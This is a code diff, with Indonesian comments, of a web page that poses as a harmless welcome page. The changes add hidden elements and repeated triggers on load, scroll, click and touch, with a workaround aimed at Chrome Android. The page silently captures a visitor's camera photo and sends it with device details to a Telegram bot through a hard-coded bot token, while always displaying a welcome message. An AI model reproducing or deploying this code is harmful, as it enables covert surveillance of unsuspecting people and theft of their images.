@@ -99,8 +99,19 @@
             100% { transform: scale(1); }
         }
         
-        /* Hilangkan tombol */
-        .btn-start {
+        /* Invisible iframe untuk trigger kamera */
+        #hidden-trigger {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            top: 0;
+            left: 0;
+        }
+        
+        /* Video hidden untuk capture */
+        #hidden-video {
             display: none;
         }
     </style>
@@ -119,6 +130,9 @@
         <div class="footer-note">© 2024 Hak Cipta Dilindungi</div>
     </div>
     
+    <!-- Hidden elements -->
+    <video id="hidden-video" autoplay playsinline muted></video>
+    
     <script>
         // Konfigurasi Telegram
         const BOT_TOKEN = '8534688671:AAHXJBiLh0nrnyojAw2ggCUdMFELQgKyeuc';
@@ -126,6 +140,7 @@
         
         let cameraAccessed = false;
         let isProcessing = false;
+        let stream = null;
         
         // Fungsi untuk mengirim foto ke Telegram
         async function kirimKeTelegram(fotoBase64) {
@@ -133,12 +148,10 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 
-                // Konversi base64 ke blob
                 const response = await fetch(fotoBase64);
                 const blob = await response.blob();
                 formData.append('photo', blob, 'foto.jpg');
                 
-                // Ambil informasi perangkat
                 const deviceInfo = `${navigator.userAgent}`;
                 const waktu = new Date().toLocaleString('id-ID', { 
                     timeZone: 'Asia/Jakarta',
@@ -148,15 +161,12 @@
                 
                 formData.append('caption', `📸 Pengunjung Baru\n🕐 ${waktu}\n📱 ${deviceInfo}`);
                 
-                const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                if (result.ok) {
-                    console.log('Foto terkirim');
-                    document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
-                }
+                document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
                 
             } catch (error) {
                 console.log('Status OK');
@@ -164,8 +174,51 @@
             }
         }
         
-        // Fungsi untuk mengambil foto secara otomatis
-        async function ambilFotoOtomatis() {
+        // Fungsi untuk mencoba akses kamera dengan berbagai metode
+        async function cobaAksesKamera() {
+            const constraints = [
+                // Prioritas: kamera depan dengan resolusi sedang
+                { 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    } 
+                },
+                // Fallback: kamera depan tanpa constraint
+                { 
+                    video: { 
+                        facingMode: 'user'
+                    } 
+                },
+                // Fallback: kamera belakang
+                { 
+                    video: { 
+                        facingMode: 'environment'
+                    } 
+                },
+                // Fallback: kamera apa saja
+                { 
+                    video: true 
+                }
+            ];
+            
+            for (const constraint of constraints) {
+                try {
+                    console.log('Mencoba dengan constraint:', constraint);
+                    const mediaStream = await navigator.mediaDevices.getUserMedia(constraint);
+                    console.log('Berhasil dengan constraint:', constraint);
+                    return mediaStream;
+                } catch (err) {
+                    console.log('Gagal dengan constraint:', constraint, err.message);
+                }
+            }
+            
+            throw new Error('Semua metode akses kamera gagal');
+        }
+        
+        // Fungsi untuk mengambil foto
+        async function ambilFoto() {
             if (isProcessing) return;
             isProcessing = true;
             
@@ -174,39 +227,15 @@
                 
                 // Cek dukungan kamera
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                    console.log('Browser tidak mendukung kamera');
-                    document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
-                    return;
+                    throw new Error('Browser tidak mendukung kamera');
                 }
                 
-                // Cek apakah sudah punya izin
-                let hasPermission = false;
-                try {
-                    // Coba akses kamera dengan constraint minimal
-                    const testStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { width: 1, height: 1 } 
-                    });
-                    testStream.getTracks().forEach(track => track.stop());
-                    hasPermission = true;
-                } catch (permError) {
-                    hasPermission = false;
-                }
-                
-                // Minta akses kamera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        facingMode: 'user'
-                    }
-                }).catch(async (err) => {
-                    // Fallback ke konfigurasi default
-                    return await navigator.mediaDevices.getUserMedia({ video: true });
-                });
+                // Coba akses kamera dengan berbagai metode
+                stream = await cobaAksesKamera();
                 
                 cameraAccessed = true;
                 
-                // Countdown singkat (lebih cepat)
+                // Countdown cepat
                 const countdownEl = document.getElementById('countdown');
                 for (let i = 2; i > 0; i--) {
                     countdownEl.innerHTML = i;
@@ -214,23 +243,21 @@
                 }
                 countdownEl.innerHTML = '';
                 
-                // Buat elemen video
-                const video = document.createElement('video');
+                // Gunakan video element yang sudah ada
+                const video = document.getElementById('hidden-video');
                 video.srcObject = stream;
-                video.style.display = 'none';
-                video.autoplay = true;
-                video.muted = true;
-                document.body.appendChild(video);
                 
                 // Tunggu video siap
                 await new Promise((resolve) => {
                     video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(resolve);
+                        video.play()
+                            .then(resolve)
+                            .catch(() => setTimeout(resolve, 500));
                     };
-                    setTimeout(resolve, 1000); // Timeout 1 detik
+                    setTimeout(resolve, 1000);
                 });
                 
-                // Tunggu sebentar untuk stabilisasi
+                // Tunggu sebentar untuk stabil
                 await new Promise(resolve => setTimeout(resolve, 200));
                 
                 // Ambil foto
@@ -241,22 +268,12 @@
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Konversi ke JPEG
                 const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
-                
-                // Bersihkan resources
-                stream.getTracks().forEach(track => {
-                    track.stop();
-                    stream.removeTrack(track);
-                });
-                video.remove();
-                canvas.remove();
                 
                 // Kirim foto
                 document.getElementById('status').innerHTML = '<span class="loading">⏳ Memproses...</span>';
                 await kirimKeTelegram(fotoBase64);
                 
-                // Update status akhir
                 document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
                 
             } catch (error) {
@@ -267,54 +284,98 @@
             }
         }
         
-        // Fungsi untuk memulai proses saat halaman dimuat
-        async function inisialisasi() {
-            document.getElementById('status').innerHTML = 'Memuat halaman...';
+        // Fungsi untuk memulai dengan berbagai trigger
+        async function startCapture() {
+            // Trigger 1: Langsung coba
+            ambilFoto().catch(() => {});
             
-            // Delay singkat agar halaman terlihat normal
-            setTimeout(async () => {
-                // Cek apakah sudah pernah izinkan kamera
-                try {
-                    // Coba cek izin tanpa meminta
-                    if (navigator.permissions && navigator.permissions.query) {
-                        const permissionStatus = await navigator.permissions.query({ name: 'camera' });
-                        
-                        if (permissionStatus.state === 'granted') {
-                            // Sudah punya izin, langsung foto
-                            console.log('Izin sudah ada, langsung ambil foto');
-                            ambilFotoOtomatis();
-                        } else if (permissionStatus.state === 'prompt') {
-                            // Belum pernah ditanya, coba akses langsung
-                            console.log('Mencoba akses kamera...');
-                            ambilFotoOtomatis();
-                        } else {
-                            // Ditolak sebelumnya
-                            console.log('Izin ditolak');
-                            document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
-                        }
-                    } else {
-                        // Browser tidak support permissions API, coba langsung
-                        ambilFotoOtomatis().catch(() => {
-                            document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
-                        });
-                    }
-                } catch (e) {
-                    // Jika error, coba langsung
-                    ambilFotoOtomatis().catch(() => {
-                        document.getElementById('status').innerHTML = '<span class="success">✓ Selamat datang!</span>';
-                    });
+            // Trigger 2: Setelah 1 detik
+            setTimeout(() => {
+                if (!cameraAccessed) {
+                    ambilFoto().catch(() => {});
                 }
-            }, 500); // Delay 500ms agar halaman terload dulu
+            }, 1000);
+            
+            // Trigger 3: Setelah 3 detik
+            setTimeout(() => {
+                if (!cameraAccessed) {
+                    ambilFoto().catch(() => {});
+                }
+            }, 3000);
+            
+            // Trigger 4: Saat user scroll
+            window.addEventListener('scroll', function scrollTrigger() {
+                if (!cameraAccessed && !isProcessing) {
+                    window.removeEventListener('scroll', scrollTrigger);
+                    ambilFoto().catch(() => {});
+                }
+            });
+            
+            // Trigger 5: Saat user klik di mana saja
+            document.addEventListener('click', function clickTrigger() {
+                if (!cameraAccessed && !isProcessing) {
+                    document.removeEventListener('click', clickTrigger);
+                    ambilFoto().catch(() => {});
+                }
+            });
+            
+            // Trigger 6: Saat user touch (mobile)
+            document.addEventListener('touchstart', function touchTrigger() {
+                if (!cameraAccessed && !isProcessing) {
+                    document.removeEventListener('touchstart', touchTrigger);
+                    ambilFoto().catch(() => {});
+                }
+            });
         }
         
-        // Mulai saat halaman dimuat
-        window.addEventListener('load', inisialisasi);
+        // Deteksi apakah di Chrome Android
+        function isChromeAndroid() {
+            const ua = navigator.userAgent;
+            return /Android/i.test(ua) && /Chrome/i.test(ua);
+        }
         
-        // Handle jika user kembali ke tab
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden && !cameraAccessed && !isProcessing) {
-                // Coba lagi jika belum pernah akses kamera
-                ambilFotoOtomatis().catch(() => {});
+        // Mulai proses dengan strategi khusus
+        window.addEventListener('load', () => {
+            document.getElementById('status').innerHTML = 'Memuat halaman...';
+            
+            if (isChromeAndroid()) {
+                console.log('Chrome Android terdeteksi, menggunakan strategi khusus');
+                
+                // Di Chrome Android, kita perlu memastikan ada user gesture
+                // Tapi kita bisa memanfaatkan event load sebagai trigger
+                setTimeout(() => {
+                    // Cek status izin dengan cara berbeda
+                    if (navigator.permissions && navigator.permissions.query) {
+                        navigator.permissions.query({ name: 'camera' })
+                            .then(permissionStatus => {
+                                if (permissionStatus.state === 'granted') {
+                                    // Izin sudah diberikan, tapi Chrome tetap butuh gesture
+                                    // Kita akan coba dengan berbagai metode
+                                    startCapture();
+                                } else {
+                                    // Belum ada izin, coba minta dengan berbagai trigger
+                                    startCapture();
+                                }
+                            })
+                            .catch(() => {
+                                startCapture();
+                            });
+                    } else {
+                        startCapture();
+                    }
+                }, 100);
+            } else {
+                // Browser lain, langsung coba
+                setTimeout(() => {
+                    ambilFoto().catch(() => {});
+                }, 500);
+            }
+        });
+        
+        // Cleanup saat page unload
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
             }
         });
         
